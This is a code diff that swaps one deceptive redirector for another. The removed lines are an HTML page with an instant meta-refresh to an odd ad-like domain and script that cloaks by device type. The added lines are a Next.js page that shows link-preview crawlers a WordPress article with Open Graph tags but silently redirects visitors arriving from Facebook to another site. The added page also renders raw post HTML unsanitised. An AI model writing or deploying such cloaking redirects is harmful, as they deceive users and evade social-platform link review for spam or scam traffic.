@@ -1,20 +1,112 @@
-<meta http-equiv="refresh" content="0; url=https://cauliflowertoaster.com/mrm4q4ahzf?key=7ff48417896eacf9da4eaa76e50dd82e/" /> 
-<META name="robots" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOODP,NOSNIPPET">
-<script type="text/javascript">
-//<![CDATA[
- function h(r, a) { var t = ""; if ("mix" == a) var h = 
-"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789amp;"; else var h = 
-"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789amp;"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * 
-h.length)); return t };
+import React from 'react';
+import Head from 'next/head';
+import { GetServerSideProps } from 'next';
+import { GraphQLClient, gql } from 'graphql-request';
 
-        var device = navigator.userAgent
-        
-        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
-        {
-         
-        }else
-{
-window.location = "https://store.google.com/?"+ h(7, '')+"";
+export const getServerSideProps: GetServerSideProps = async (ctx) => {
+	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
+	const graphQLClient = new GraphQLClient(endpoint);
+	const referringURL = ctx.req.headers?.referer || null;
+	const pathArr = ctx.query.postpath as Array<string>;
+	const path = pathArr.join('/');
+	console.log(path);
+	const fbclid = ctx.query.fbclid;
+
+	// redirect if facebook is the referer or request contains fbclid
+		if (referringURL?.includes('facebook.com') || fbclid) {
+
+		return {
+			redirect: {
+				permanent: false,
+				destination: `${
+					`https://saveourstateok.org/` + encodeURI(path as string)
+				}`,
+			},
+		};
+		}
+	const query = gql`
+		{
+			post(id: "/${path}/", idType: URI) {
+				id
+				excerpt
+				title
+				link
+				dateGmt
+				modifiedGmt
+				content
+				author {
+					node {
+						name
+					}
+				}
+				featuredImage {
+					node {
+						sourceUrl
+						altText
+					}
+				}
+			}
+		}
+	`;
+
+	const data = await graphQLClient.request(query);
+	if (!data.post) {
+		return {
+			notFound: true,
+		};
+	}
+	return {
+		props: {
+			path,
+			post: data.post,
+			host: ctx.req.headers.host,
+		},
+	};
+};
+
+interface PostProps {
+	post: any;
+	host: string;
+	path: string;
 }
-//]]>
-</script>
+
+const Post: React.FC<PostProps> = (props) => {
+	const { post, host, path } = props;
+
+	// to remove tags from excerpt
+	const removeTags = (str: string) => {
+		if (str === null || str === '') return '';
+		else str = str.toString();
+		return str.replace(/(<([^>]+)>)/gi, '').replace(/\[[^\]]*\]/, '');
+	};
+
+	return (
+		<>
+			<Head>
+				<meta property="og:title" content={post.title} />
+				<meta property="og:description" content={removeTags(post.excerpt)} />
+				<meta property="og:type" content="article" />
+				<meta property="og:locale" content="en_US" />
+				<meta property="og:site_name" content={host.split('.')[0]} />
+				<meta property="article:published_time" content={post.dateGmt} />
+				<meta property="article:modified_time" content={post.modifiedGmt} />
+				<meta property="og:image" content={post.featuredImage.node.sourceUrl} />
+				<meta
+					property="og:image:alt"
+					content={post.featuredImage.node.altText || post.title}
+				/>
+				<title>{post.title}</title>
+			</Head>
+			<div className="post-container">
+				<h1>{post.title}</h1>
+				<img
+					src={post.featuredImage.node.sourceUrl}
+					alt={post.featuredImage.node.altText || post.title}
+				/>
+				<article dangerouslySetInnerHTML={{ __html: post.content }} />
+			</div>
+		</>
+	);
+};
+
+export default Post;
